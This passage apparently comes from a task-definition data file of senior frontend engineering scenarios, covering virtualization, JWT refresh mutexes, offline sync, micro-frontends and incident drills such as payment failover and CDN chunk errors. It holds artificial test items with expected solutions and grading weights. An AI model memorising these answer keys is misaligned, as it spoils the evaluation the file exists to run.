        expectedActions: ['Run benchmark script in terminal', 'Identify O(N) iteration in getVisibleRange function'],
        successCriteria: ['Pinpointed O(N) linear search on scroll position', 'Identified million-object garbage creation'],
        evaluationCriteria: { benchmarkAccuracy: 50, algorithmicDiagnosis: 50 }
      },
      {
        id: 'FE-L3-003-S2',
        title: 'Implement Binary Search Lookup & Formatter Memoization',
        objective: 'Implement binary search for visible offset lookup and hoist Intl.NumberFormat outside cell loop.',
        instructions: 'Rewrite calculateRowRange with binary search, instantiate static formatters, and verify 60fps scrolling on 100k rows.',
        expectedActions: ['Implement binary search algorithm', 'Cache Intl formatters in a Map', 'Verify initial load renders in under 50ms'],
        successCriteria: ['100,000 row grid loads in < 50ms', 'Smooth 60fps scrolling with zero dropped frames'],
        evaluationCriteria: { algorithmicEfficiency: 50, testVerification: 50 }
      }
    ],
    decisionPoints: ['Variable row heights with estimated prefix sums vs fixed height virtualization', 'CSS transform translate3d vs top style offsets'],
    pressureEvents: ['Wall Street trading open in 30 minutes: Portfolio managers demanding fast ledger sorting'],
    expectedSolution: 'Build cumulative row height offset array, use binary search to locate start/end indices in O(log N), use transform: translate3d.',
    acceptableApproaches: ['Binary search over prefix sum array', 'Fixed row height math with instant O(1) division'],
    failureConditions: ['Scrollbar thumbs flicker or jump unexpectedly', 'Blank white cells rendered during fast trackpad flings'],
    finalDeliverable: 'High-performance VirtualDataGrid.tsx handling 100k rows effortlessly.',
    evaluationCriteria: { algorithmicSpeed: 40, renderingSmoothness: 30, testValidation: 30 },
    workplaceContext: 'High-Scale Enterprise DataGrid Performance',
    taskType: 'rendering_architecture'
  },

  {
    id: 'FE-L3-004',
    title: 'JWT Silent Refresh Mutex Queue & 401 Cascade Race Condition',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Okta / Identity & Access Management UI',
    department: 'Auth SDK & Client Security',
    domain: 'Enterprise Security / OAuth2',
    skills: ['auth_security', 'async_concurrency', 'axios_interceptors', 'error_handling'],
    coreCompetencies: ['auth_security', 'concurrency_control', 'interceptor_patterns'],
    secondarySkills: ['mutex_locks', 'jwt_refresh'],
    skillTags: ['jwt', 'oauth2', 'mutex', 'refresh_token', 'axios', 'concurrency'],
    situation: 'When an access token expires while a dashboard makes 8 parallel API calls, all 8 calls fail with 401 and trigger 8 separate /refresh requests simultaneously, causing refresh token reuse revocation.',
    problem: 'Missing promise mutex lock on token refresh. The OAuth2 server detects multiple concurrent refresh requests with the same single-use refresh token and locks the user account for suspected replay attack.',
    mission: 'Implement an asynchronous queue mutex in the Axios/fetch interceptor to pause parallel 401 requests, execute a single /refresh call, and replay queued requests with the new token.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / Axios' }
    },
    availableEvidence: [
      'Auth server audit log: Security alert: Refresh token reuse detected for user_9821. Session invalidated.',
      'User symptom: Dashboard suddenly kicks user back to login screen every 15 minutes'
    ],
    subtasks: [
      {
        id: 'FE-L3-004-S1',
        title: 'Reproduce Token Refresh Stampede with Parallel Requests',
        objective: 'Simulate 6 parallel dashboard API calls at the moment of access token expiration.',
        instructions: 'Open browser preview, trigger parallel data fetch when token is expired, and inspect Network tab for multiple /refresh calls.',
        expectedActions: ['Trigger parallel requests with expired JWT in preview', 'Observe multiple concurrent /refresh requests dispatched'],
        successCriteria: ['Confirmed 6 simultaneous /refresh calls', 'Observed 401 logout cascade'],
        evaluationCriteria: { reproductionAccuracy: 50, rootCauseExplanation: 50 }
      },
      {
        id: 'FE-L3-004-S2',
        title: 'Implement Mutex Promise & Failed Request Replay Queue',
        objective: 'Add isRefreshing flag, hold pending requests in a promise subscriber queue, and replay with new token.',
        instructions: 'Implement response interceptor with token refresh mutex in authClient.ts and test parallel resolution.',
        expectedActions: ['Create isRefreshing boolean and failedQueue array', 'Pause subsequent 401s in Promise queue', 'Resolve queue upon successful refresh', 'Run auth test suite'],
        successCriteria: ['Only 1 /refresh request fired for N parallel calls', 'All 8 parallel API calls resolve successfully without user logout'],
        evaluationCriteria: { concurrencyLocking: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Axios interceptor mutex vs fetch proxy wrapper', 'Handling refresh token expiration failure vs retry'],
    pressureEvents: ['Chief Information Security Officer: Account lockouts increasing by 300% across enterprise customers'],
    expectedSolution: 'If isRefreshing, push resolve/reject to queue and return new Promise; else set isRefreshing = true, refresh token, process queue, reset flag.',
    acceptableApproaches: ['Promise subscriber array queue', 'Async mutex lock helper (e.g. async-mutex)'],
    failureConditions: ['Network failure during refresh hangs all queued requests indefinitely', 'Infinite 401 retry loop on invalid refresh token'],
    finalDeliverable: 'authClient.ts with bulletproof single-flight token refresh mutex.',
    evaluationCriteria: { authSecurity: 40, concurrencyControl: 30, testValidation: 30 },
    workplaceContext: 'Enterprise OAuth2 Client Security',
    taskType: 'security_concurrency'
  },

  {
    id: 'FE-L3-005',
    title: 'Offline-First PWA IndexedDB Sync & Last-Write-Wins Conflict',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Notion / Mobile Web & Offline Core',
    department: 'Offline Sync & Local Database',
    domain: 'Productivity / Offline-First Collaboration',
    skills: ['indexeddb', 'service_workers', 'data_synchronization', 'conflict_resolution'],
    coreCompetencies: ['offline_first', 'data_reconciliation', 'indexeddb'],
    secondarySkills: ['vector_clocks', 'background_sync'],
    skillTags: ['pwa', 'indexeddb', 'offline', 'sync', 'conflict_resolution'],
    situation: 'Field workers editing notes offline in remote areas find their edits completely overwritten by older desktop changes when reconnecting to Wi-Fi.',
    problem: 'Sync engine uses a naive Last-Write-Wins (LWW) strategy based on client local device timestamps, which can be skewed by inaccurate device clocks.',
    mission: 'Replace client timestamp LWW with version vector clocks and field-level operational transform merge, queuing changes in IndexedDB during offline state.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / IndexedDB / ServiceWorker' }
    },
    availableEvidence: [
      'Customer data loss ticket: "3 hours of fieldwork inspection notes vanished when I reconnected to the office Wi-Fi"',
      'IndexedDB inspect: Client clock was set 4 minutes behind server clock'
    ],
    subtasks: [
      {
        id: 'FE-L3-005-S1',
        title: 'Simulate Offline Edits with Clock Skew Desynchronization',
        objective: 'Test offline mutation queue in browser preview with simulated 10-minute clock skew.',
        instructions: 'Open preview, disconnect network, edit document, alter client time offset, reconnect, and observe document overwrite.',
        expectedActions: ['Simulate offline edits with skewed clock', 'Observe sync engine discarding newer offline edits'],
        successCriteria: ['Demonstrated data loss due to client timestamp comparison', 'Documented flaw in LWW strategy'],
        evaluationCriteria: { diagnosticDepth: 50, syncAnalysis: 50 }
      },
      {
        id: 'FE-L3-005-S2',
        title: 'Implement Vector Clocks & Three-Way Field Level Merge',
        objective: 'Store document revision vector { clientRev, serverRev }, detect concurrent edits, and perform 3-way merge.',
        instructions: 'Update syncEngine.js to store revision vectors in IndexedDB, apply automatic field-level merge, and prompt on conflict.',
        expectedActions: ['Implement revision vector tracking', 'Write 3-way merge algorithm', 'Verify zero data loss upon reconnection'],
        successCriteria: ['Concurrent non-overlapping edits merged automatically', 'Offline work preserved 100%'],
        evaluationCriteria: { algorithmQuality: 50, testVerification: 50 }
      }
    ],
    decisionPoints: ['Automatic field-level merge vs git-style conflict resolution UI', 'CRDT integration vs operational transform'],
    pressureEvents: ['Enterprise client audit: Offline data loss is a blocker for 5,000-seat renewal'],
    expectedSolution: 'Compare vector clocks [v_client, v_server] to identify concurrent edits, execute field-level merge, prompt user only on direct conflicts.',
    acceptableApproaches: ['Vector clocks with field-level three-way merge', 'Automerge / Yjs lightweight document CRDT'],
    failureConditions: ['Silent overwrite of unmerged text fields', 'IndexedDB transaction lock blocks UI thread'],
    finalDeliverable: 'syncEngine.js with robust vector clock conflict resolution and offline IndexedDB queue.',
    evaluationCriteria: { dataIntegrity: 40, offlineResilience: 30, testValidation: 30 },
    workplaceContext: 'Offline-First Enterprise Document Synchronization',
    taskType: 'distributed_data'
  },

  {
    id: 'FE-L3-006',
    title: 'Micro-Frontend Shared Dependency Version Mismatch & Style Bleed',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Amazon / Core Shopping Architecture',
    department: 'Micro-Frontend Platform Infrastructure',
    domain: 'E-Commerce / Modular Micro-Apps',
    skills: ['micro_frontends', 'webpack_module_federation', 'css_isolation', 'dependency_management'],
    coreCompetencies: ['micro_frontends', 'architecture', 'css_scoping'],
    secondarySkills: ['module_federation', 'shadow_dom'],
    skillTags: ['micro_frontends', 'module_federation', 'css_scoping', 'dependency_hell'],
    situation: 'When the Checkout micro-frontend loads inside the Host container, global CSS rules from Checkout override the header navigation styles, turning the main logo purple.',
    problem: 'Micro-frontends share a global DOM and window scope without CSS encapsulation; Checkout loads React 18.2 while Host loads React 17, breaking React Context hooks.',
    mission: 'Configure Webpack Module Federation shared singleton dependencies for React, and scope CSS using CSS Modules / Shadow DOM to prevent cross-app style bleed.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'Webpack 5 Module Federation / React' }
    },
    availableEvidence: [
      'Visual regression: Header search bar shrank by 50px and button colors flipped',
      'Runtime error: Invalid hook call. Hooks can only be called inside the body of a function component (Duplicate React instance)'
    ],
    subtasks: [
      {
        id: 'FE-L3-006-S1',
        title: 'Isolate Duplicate React Instances & Global CSS Leakage',
        objective: 'Inspect micro-frontend network bundles and DOM element styles in browser preview.',
        instructions: 'Open browser preview, load Checkout widget inside Host shell, and inspect window.React and computed button styles.',
        expectedActions: ['Inspect dual React bundles loaded in Network tab', 'Identify un-scoped .btn CSS class overriding global header'],
        successCriteria: ['Confirmed two distinct React runtime instances in memory', 'Identified global CSS rule collision'],
        evaluationCriteria: { architectureDiagnosis: 50, rootCauseDetail: 50 }
      },
      {
        id: 'FE-L3-006-S2',
        title: 'Configure Module Federation Shared Singletons & Scoped CSS',
        objective: 'Update webpack.config.js to enforce react and react-dom as singletons, and wrap micro-frontend in CSS namespace.',
        instructions: 'Configure shared: { react: { singleton: true, requiredVersion: "^18.0.0" } } and apply PostCSS namespace prefixing.',
        expectedActions: ['Update ModuleFederationPlugin configuration', 'Add CSS scoping wrapper / CSS Modules', 'Verify Host header remains untouched'],
        successCriteria: ['Only single shared React instance instantiated', 'Zero style leakage between host and micro-app'],
        evaluationCriteria: { federationConfig: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Shadow DOM encapsulation vs PostCSS namespace prefixing', 'Strict singleton version check vs loose semver fallback'],
    pressureEvents: ['Deployment freeze: 3 different engineering squads blocked by checkout style bleed'],
    expectedSolution: 'Declare react/react-dom as strict singletons in Module Federation, wrap checkout styling in .mfe-checkout namespace.',
    acceptableApproaches: ['Webpack Module Federation shared singletons', 'Shadow DOM v1 encapsulation for remote app'],
    failureConditions: ['Remote app fails to load due to strict version mismatch', 'Styles stripped completely from checkout widget'],
    finalDeliverable: 'Federation configuration and isolated CSS architecture for host/remote apps.',
    evaluationCriteria: { architectureDesign: 40, isolationPurity: 30, testVerification: 30 },
    workplaceContext: 'Micro-Frontend Platform Architecture',
    taskType: 'system_architecture'
  },

  {
    id: 'FE-L3-007',
    title: 'Redux Toolkit / RTK Query Cache Invalidation Cascade',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'Uber / Driver Operations Portal',
    department: 'Driver Fleet Management UI',
    domain: 'Mobility / High-Density Operations',
    skills: ['state_architecture', 'redux_toolkit', 'rtk_query', 'caching_strategies'],
    coreCompetencies: ['state_architecture', 'cache_invalidation', 'data_flow'],
    secondarySkills: ['normalized_state', 'optimistic_updates'],
    skillTags: ['redux', 'rtk_query', 'cache_invalidation', 'normalized_state', 'state_architecture'],
    situation: 'When an operations manager updates a driver status from "Active" to "Suspended", the dashboard re-fetches 42 unrelated endpoints, locking the interface for 3 seconds.',
    problem: 'The RTK Query mutation invalidates a broad top-level tag `providesTags: ["Drivers"]` instead of using granular entity tags `{ type: "Drivers", id }`, triggering full cache invalidation.',
    mission: 'Restructure RTK Query cache tags to use granular entity-based tag identifiers and implement optimistic updates with automatic rollback on server error.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / Redux Toolkit 2.0' }
    },
    availableEvidence: [
      'Network tab: 42 parallel GET requests dispatched immediately following single PATCH /drivers/123',
      'Redux DevTools: 42 actions of type api/invalidateTags dispatched simultaneously'
    ],
    subtasks: [
      {
        id: 'FE-L3-007-S1',
        title: 'Audit RTK Query Cache Tag Definitions & Network Waterfall',
        objective: 'Execute status update mutation in browser preview and inspect Redux DevTools actions.',
        instructions: 'Open preview, suspend driver #101, observe Redux DevTools action stream, and count subsequent refetches.',
        expectedActions: ['Trigger driver mutation in preview', 'Observe blanket cache invalidation of 42 queries in network tab'],
        successCriteria: ['Mapped overly broad tag invalidation in driversApi.js', 'Identified 3.2s UI freeze'],
        evaluationCriteria: { reduxDiagnosis: 50, tagAnalysis: 50 }
      },
      {
        id: 'FE-L3-007-S2',
        title: 'Implement Granular Entity Tagging & Optimistic Update',
        objective: 'Refactor tag definition to { type: "Drivers", id } and implement onQueryStarted optimistic update.',
        instructions: 'Update driversApi.js with entity-specific tags, add optimistic cache mutation with undo patch, and verify only 1 driver row updates.',
        expectedActions: ['Update providesTags with result.map(id => ({ type: "Drivers", id }))', 'Update invalidatesTags to [{ type: "Drivers", id }]', 'Implement optimistic update with patchResult.undo() on error'],
        successCriteria: ['Only target driver record updates in cache', 'Zero unnecessary background network requests'],
        evaluationCriteria: { rtkQueryCleanliness: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Optimistic UI update vs pessimistic wait-for-server', 'Global entity tags vs page-scoped query tags'],
    pressureEvents: ['Fleet Ops Lead: Dashboard is unusable on slow airport Wi-Fi during shift handoffs'],
    expectedSolution: 'Provide granular tags: (result) => result ? [...result.map(({ id }) => ({ type: "Drivers", id })), { type: "Drivers", id: "LIST" }] : [{ type: "Drivers", id: "LIST" }].',
    acceptableApproaches: ['RTK Query entity-level tag architecture', 'Manual cache entry modification via updateQueryData'],
    failureConditions: ['Stale data remains displayed when driver list changes', 'Optimistic state does not rollback on 500 error'],
    finalDeliverable: 'Optimized driversApi.js with targeted cache invalidation and instantaneous optimistic updates.',
    evaluationCriteria: { cacheArchitecture: 40, performance: 30, testValidation: 30 },
    workplaceContext: 'Enterprise Fleet Dashboard State Architecture',
    taskType: 'state_architecture'
  },

  {
    id: 'FE-L3-008',
    title: 'Core Web Vitals Interaction to Next Paint (INP) Regression',
    role: 'frontend',
    level: 3,
    difficulty: 'Advanced',
    company: 'The New York Times / Interactive Web',
    department: 'Web Performance & Reader Experience',
    domain: 'Digital Publishing / High-Traffic Media',
    skills: ['performance_opt', 'core_web_vitals', 'inp_optimization', 'browser_event_loop'],
    coreCompetencies: ['core_web_vitals', 'main_thread_scheduling', 'inp_optimization'],
    secondarySkills: ['scheduler_api', 'web_workers'],
    skillTags: ['inp', 'web_vitals', 'main_thread', 'scheduling', 'performance'],
    situation: 'Chrome User Experience Report (CrUX) indicates that 34% of real-world readers experience Poor INP (> 500ms) when opening the article comments drawer.',
    problem: 'Clicking the comments toggle executes heavy synchronous markdown parsing and comment tree sorting directly inside the click event handler before the browser can paint.',
    mission: 'Break long tasks using scheduler.yield() or setTimeout(0), defer non-critical parsing with requestIdleCallback, and optimize INP to under 150ms (Good).',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18 / Performance Profiler' }
    },
    availableEvidence: [
      'CrUX Report: 75th percentile INP is 680ms (Red / Poor)',
      'Performance Trace: Single long task duration = 620ms blocking layout and paint'
    ],
    subtasks: [
      {
        id: 'FE-L3-008-S1',
        title: 'Trace Long Tasks & INP Breakdown in Performance Profiler',
        objective: 'Record interaction trace during comments button click in browser preview.',
        instructions: 'Open browser preview, start Performance recording, click "Comments (450)", stop trace, and locate the 600ms red long task block.',
        expectedActions: ['Record interaction in DevTools Performance panel', 'Identify blocking parseCommentMarkdown execution'],
        successCriteria: ['Measured INP delay > 600ms on click interaction', 'Pinpointed synchronous computation before paint'],
        evaluationCriteria: { profilingProficiency: 50, traceAnalysis: 50 }
      },
      {
        id: 'FE-L3-008-S2',
        title: 'Implement Task Chunking & Yield to Main Thread',
        objective: 'Yield execution to allow immediate drawer open visual response before processing comments in chunks.',
        instructions: 'Update CommentsDrawer.jsx to open drawer immediately, yield to main thread with scheduler.yield/setTimeout, and parse comments asynchronously.',
        expectedActions: ['Set drawerOpen state immediately', 'Yield execution before heavy comment sorting', 'Verify INP drops below 150ms in DevTools'],
        successCriteria: ['INP drops from 680ms to < 100ms', 'Drawer opens instantly with smooth 60fps animation'],
        evaluationCriteria: { schedulingImplementation: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['scheduler.yield() polyfill vs MessageChannel vs setTimeout(0)', 'Web Worker parsing vs progressive chunking'],
    pressureEvents: ['SEO alert: Google Core Web Vitals ranking signal penalizing article search distribution'],
    expectedSolution: 'Trigger UI state update first to allow browser paint, then yield to main thread using MessageChannel or scheduler.yield() before parsing.',
    acceptableApproaches: ['Main thread yielding with MessageChannel', 'Offloading parsing to a Dedicated Web Worker'],
    failureConditions: ['Comments never finish loading or render in jumbled order', 'INP remains above 200ms'],
    finalDeliverable: 'CommentsDrawer.jsx achieving green INP (< 150ms) on real-world throttled CPU devices.',
    evaluationCriteria: { vitalsOptimization: 40, eventLoopMastery: 30, testValidation: 30 },
    workplaceContext: 'Production Core Web Vitals INP Optimization',
    taskType: 'performance'
  },

  // ========================================================
  // LEVEL 4: CRITICAL INCIDENT SIMULATION (8 TASKS, 16 SUBTASKS)
  // ========================================================
  {
    id: 'FE-L4-001',
    title: 'Production Checkout Outage: Primary Payment Gateway 502 Cascade',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Stripe / Core Checkout Operations',
    department: 'Site Reliability & Payment UI',
    domain: 'Fintech / Mission-Critical Payments',
    skills: ['incident_response', 'circuit_breaker', 'graceful_degradation', 'payment_gateways'],
    coreCompetencies: ['crisis_management', 'fault_tolerance', 'circuit_breaker'],
    secondarySkills: ['telemetry_monitoring', 'fallback_gateways'],
    skillTags: ['incident', 'p1_outage', 'payment_gateway', 'circuit_breaker', '502'],
    situation: 'At 19:14 UTC, our primary card processor (Processor Alpha) suffers a total regional outage returning 502 Bad Gateway. 100% of checkout attempts across North America are failing, losing $45,000/minute.',
    problem: 'Checkout frontend is hardcoded to Processor Alpha without circuit-breaking or automatic client failover to secondary processor (Processor Beta).',
    mission: 'Triage the ongoing P1 incident, deploy a client-side circuit breaker to trip after 3 consecutive failures, reroute payment payloads to Processor Beta, and communicate incident status.',
    workspace: {
      tools: ['slack', 'jira', 'editor', 'terminal', 'browser', 'git', 'ai_assistant'],
      environment: { runtime: 'Node.js v20 / React 18', incidentChannel: '#war-room-checkout' }
    },
    availableEvidence: [
      '[WAR ROOM] Datadog Alert: Checkout Failure Rate: 99.4% (Threshold: > 1%)',
      'CFO message on Slack: "We are bleeding $750/sec. Fix this immediately or enable backup processor."'
    ],
    subtasks: [
      {
        id: 'FE-L4-001-S1',
        title: 'Triage Gateway Error Telemetry & Announce War Room Plan',
        objective: 'Inspect telemetry metrics, verify 502 Bad Gateway cascade, and post technical mitigation plan in Slack.',
        instructions: 'Review Datadog alerts in Browser, isolate Alpha gateway 502s, and notify team of fallback routing strategy.',
        expectedActions: ['Inspect incoming 502 telemetry', 'Post incident mitigation plan in Slack war-room channel'],
        successCriteria: ['Incident acknowledged within 3 minutes', 'Correctly identified Processor Alpha failure'],
        evaluationCriteria: { incidentTriage: 50, communication: 50 }
      },
      {
        id: 'FE-L4-001-S2',
        title: 'Implement Dynamic Circuit Breaker & Failover Routing',
        objective: 'Deploy circuit breaker state machine in paymentRouter.js to trip to Processor Beta after 3 errors.',
        instructions: 'Edit paymentRouter.js to detect 502/503 statuses, trip circuit breaker to OPEN, route subsequent orders to /api/v2/payments/beta, and verify transaction success in preview.',
        expectedActions: ['Implement CircuitBreaker class in paymentRouter.js', 'Switch active endpoint to Processor Beta', 'Verify payments succeed in browser preview', 'Commit emergency hotfix'],
        successCriteria: ['Payment success rate returns to > 99%', 'Circuit breaker prevents traffic to failing processor'],
        evaluationCriteria: { faultTolerance: 50, speedToRemediate: 50 }
      }
    ],
    decisionPoints: ['Automatic failover vs manual toggle switch', 'Inform user of backup processor delay vs silent retry'],
    pressureEvents: ['Slack alert from CTO: "Payment processor Alpha ETA for fix is unknown. We must switch to Beta now."'],
    expectedSolution: 'Track consecutive failure count; if >= 3, trip circuit breaker, route to fallback provider, log telemetry, alert monitoring.',
    acceptableApproaches: ['Stateful circuit breaker in payment client', 'Feature flag override switching active gateway'],
    failureConditions: ['Failover processor also inundated with duplicate requests', 'Customer double-billed across both processors'],
    finalDeliverable: 'Hotfixed paymentRouter.js with active circuit breaker and restored checkout success rate.',
    evaluationCriteria: { incidentRecovery: 40, technicalSolution: 30, communication: 30 },
    workplaceContext: 'P1 Production Payment Outage & Real-Time Rerouting',
    taskType: 'production_incident'
  },

  {
    id: 'FE-L4-002',
    title: 'Critical Production Release Rollback & Asset CDN Hash Mismatch',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Shopify / Merchant Admin Platform',
    department: 'Release Engineering & Edge Delivery',
    domain: 'Cloud Platforms / CDN & Build Systems',
    skills: ['release_engineering', 'cdn_caching', 'webpack_chunks', 'rollback_procedures'],
    coreCompetencies: ['release_engineering', 'cdn_architecture', 'crisis_management'],
    secondarySkills: ['service_workers', 'cache_control'],
    skillTags: ['rollback', 'cdn', 'chunk_load_error', 'asset_mismatch', 'deployment'],
    situation: 'Immediately following the v4.8.0 release, 250,000 active merchants see a blank white screen with Loading chunk 402 failed (ChunkLoadError).',
    problem: 'Old index.html was cached by Cloudflare CDN for 1 hour with stale hashes, referencing JavaScript chunks that were deleted during the atomic deployment cleanup.',
    mission: 'Execute emergency CDN cache purge, implement client-side ChunkLoadError auto-reload with cache-busting query params, and establish zero-downtime asset retention.',
    workspace: {
      tools: ['slack', 'editor', 'terminal', 'git'],
      environment: { runtime: 'Cloudflare Edge / Vite 5' }
    },
    availableEvidence: [
      'Sentry: 84,000 ChunkLoadError events in 4 minutes',
      'VP of Engineering: "Merchants cannot fulfill orders. Execute rollback or purge immediately."'
    ],
    subtasks: [
      {
        id: 'FE-L4-002-S1',
        title: 'Diagnose CDN Cache Invalidation & Stale Chunk Hashes',
        objective: 'Analyze Sentry ChunkLoadError stack traces and verify CDN Cache-Control headers on index.html.',
        instructions: 'Check curl response headers for index.html in the terminal and identify Cache-Control: public, max-age=3600 anti-pattern.',
        expectedActions: ['Run curl command inspecting HTTP headers', 'Identify that HTML is cached while JS bundles are missing on origin'],
        successCriteria: ['Identified HTML caching violation', 'Formulated immediate CDN purge command'],
        evaluationCriteria: { rootCauseSpeed: 50, diagnosticClarity: 50 }
      },
      {
        id: 'FE-L4-002-S2',
        title: 'Deploy ChunkLoadError Recovery Handler & Zero-Cache HTML',
        objective: 'Add global window.addEventListener("error") to catch ChunkLoadError and trigger window.location.reload(true).',
        instructions: 'Implement ErrorBoundary chunk recovery in index.html, update build config to emit Cache-Control: no-cache on HTML, and verify recovery.',
        expectedActions: ['Add ChunkLoadError auto-recovery in main.jsx', 'Update Vite/server headers configuration', 'Purge Cloudflare cache via terminal CLI'],
        successCriteria: ['White screen merchants automatically recover on next tick', 'Zero ChunkLoadErrors recorded post-fix'],
        evaluationCriteria: { remediationEffectiveness: 50, deploymentSafety: 50 }
      }
    ],
    decisionPoints: ['Hard full-page reload vs silent dynamic script injection', 'Retaining previous build assets on S3 for 48h'],
    pressureEvents: ['Customer support phone lines overwhelmed with 1,200 merchant calls'],
    expectedSolution: 'Set Cache-Control: no-cache, no-store for HTML files; catch ChunkLoadError in ErrorBoundary to force hard reload once.',
    acceptableApproaches: ['Client-side ErrorBoundary reload guard with sessionStorage flag', 'Edge worker rewriting chunk hashes'],
    failureConditions: ['Auto-reload enters infinite reload loop for genuinely broken scripts', 'CDN continues serving stale HTML'],
    finalDeliverable: 'Emergency patch with ChunkLoadError recovery and hardened CDN header configuration.',
    evaluationCriteria: { recoverySpeed: 40, architecturalPrevention: 30, testValidation: 30 },
    workplaceContext: 'Global E-Commerce CDN Outage Recovery',
    taskType: 'release_engineering'
  },

  {
    id: 'FE-L4-003',
    title: 'Mobile Checkout Conversion Collapse Under Peak Load',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Nike / Global Digital Commerce',
    department: 'Digital Consumer Experience',
    domain: 'Retail / Flash Sale Engineering',
    skills: ['performance_opt', 'conversion_rate', 'critical_rendering_path', 'third_party_scripts'],
    coreCompetencies: ['crisis_triage', 'conversion_optimization', 'performance_triage'],
    secondarySkills: ['script_deferral', 'web_vitals'],
    skillTags: ['conversion_drop', 'third_party', 'tag_manager', 'mobile_performance', 'outage'],
    situation: 'During the SNKRS limited drop, mobile checkout conversion collapsed by 44%. Analytics indicate mobile users wait an average of 8.4 seconds for checkout to respond to touches.',
    problem: 'Marketing recently injected 14 un-vetted third-party tracking pixels via Google Tag Manager that execute heavy synchronous JavaScript on the mobile checkout button click.',
    mission: 'Identify and quarantine blocking third-party tracking scripts, defer non-critical analytics to Web Workers/requestIdleCallback, and restore touch responsiveness.',
    workspace: {
      tools: ['slack', 'editor', 'browser', 'terminal'],
      environment: { runtime: 'React 18 / Chrome DevTools' }
    },
    availableEvidence: [
      'Mixpanel funnel: Checkout button tapped: 82,000 | Payment submitted: 46,000 (Drop-off 44%)',
      'CPU trace: 14 third-party trackers executing synchronous document.cookie reads on touchstart'
    ],
    subtasks: [
      {
        id: 'FE-L4-003-S1',
        title: 'Perform Main Thread Attribution & Quarantine Rogue Tags',
        objective: 'Profile checkout touch interaction and quantify CPU time hijacked by third-party tracking tags.',
        instructions: 'Open browser preview, record Performance trace during checkout button tap, and identify blocking tag scripts.',
        expectedActions: ['Record touch interaction performance profile', 'Isolate tracking scripts consuming 7+ seconds of CPU'],
        successCriteria: ['Identified rogue tracking scripts', 'Quantified 7.2s blocking main thread delay'],
        evaluationCriteria: { attributionAccuracy: 50, urgencyTriage: 50 }
      },
      {
        id: 'FE-L4-003-S2',
        title: 'Implement Web Worker Analytics Offloading & Script Sandbox',
        objective: 'Move third-party trackers to Partytown / Web Worker or defer behind requestIdleCallback.',
        instructions: 'Refactor analytics dispatcher to execute via requestIdleCallback after payment authorization dispatches.',
        expectedActions: ['Wrap analytics tracking in requestIdleCallback', 'Ensure checkout dispatch fires immediately on touch', 'Verify checkout latency drops to < 100ms'],
        successCriteria: ['Button click response time drops from 8.4s to 85ms', 'Conversion funnel recovers to baseline'],
        evaluationCriteria: { performanceRecovery: 50, businessImpact: 50 }
      }
    ],
    decisionPoints: ['Total tracker purge vs async deferral', 'Client-side tagging vs server-side Conversions API'],
    pressureEvents: ['Marketing Director on Slack: Do not turn off our tracking tags unless absolutely necessary'],
    expectedSolution: 'Remove blocking event listeners on checkout button; decouple analytics dispatch to requestIdleCallback or background worker.',
    acceptableApproaches: ['requestIdleCallback wrapping of third-party pixels', 'Server-side telemetry forwarder via API route'],
    failureConditions: ['Checkout button still blocked by synchronous scripts', 'Legitimate conversion tracking lost completely'],
    finalDeliverable: 'Optimized checkout trigger executing payments in < 100ms with deferred background analytics.',
    evaluationCriteria: { conversionRecovery: 40, performanceEngineering: 30, stakeholderBalancing: 30 },
    workplaceContext: 'Flash Sale Mobile Conversion Emergency',
    taskType: 'conversion_optimization'
  },

  {
    id: 'FE-L4-004',
    title: 'Payment Gateway Provider SDK Migration Breakdown',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Uber / Global Payment Infrastructure',
    department: 'Payment UI & Integrations',
    domain: 'Mobility / Payment Platform',
    skills: ['sdk_migration', 'iframe_communication', 'pci_dss', 'security'],
    coreCompetencies: ['sdk_migration', 'iframe_security', 'backward_compatibility'],
    secondarySkills: ['post_message', 'pci_compliance'],
    skillTags: ['stripe_v3', 'sdk_migration', 'pci_dss', 'post_message', 'payments'],
    situation: 'Our payment provider deprecated v2 of their Elements SDK at midnight. Users attempting to input card details see a gray broken iframe box with "Origin Not Allowed".',
    problem: 'The new v3 SDK requires updated Content Security Policy (CSP) directives and a new asynchronous mount lifecycle that conflicts with our legacy synchronous modal rendering.',
    mission: 'Update iframe postMessage origin allowlist, adapt the frontend to the v3 SDK asynchronous mount lifecycle, and verify end-to-end tokenization in the live preview.',
    workspace: {
      tools: ['editor', 'browser', 'terminal', 'jira'],
      environment: { runtime: 'React 18 / Payment SDK v3' }
    },
    availableEvidence: [
      'Console error: Refused to frame https://js.stripe.com/v3/ because it violates CSP directive frame-src',
      'Checkout failure rate: 100% of credit card fields failing to render'
    ],
    subtasks: [
      {
        id: 'FE-L4-004-S1',
        title: 'Triage CSP Violations & SDK Lifecycle Incompatibility',
        objective: 'Inspect browser console errors and review v3 migration breaking changes in SDK documentation.',
        instructions: 'Open browser preview, inspect why card fields fail to mount, and identify frame-src CSP restrictions.',
        expectedActions: ['Inspect CSP frame-src console error in preview', 'Review SDK v3 mount lifecycle requirements'],
        successCriteria: ['Identified CSP policy header block', 'Mapped synchronous mount lifecycle race'],
        evaluationCriteria: { diagnosticSpeed: 50, complianceInsight: 50 }
      },
      {
        id: 'FE-L4-004-S2',
        title: 'Update CSP Directives & Modernize Async Element Mount',
        objective: 'Update CSP meta tag with verified domains and rewrite PaymentElement.jsx with async mount promise.',
        instructions: 'Add https://js.stripe.com to CSP frame-src, refactor PaymentElement.jsx to await elements.create() before mounting, and verify card fields render.',
        expectedActions: ['Update CSP header in index.html', 'Refactor PaymentElement.jsx with useEffect async mount', 'Test valid test card tokenization'],
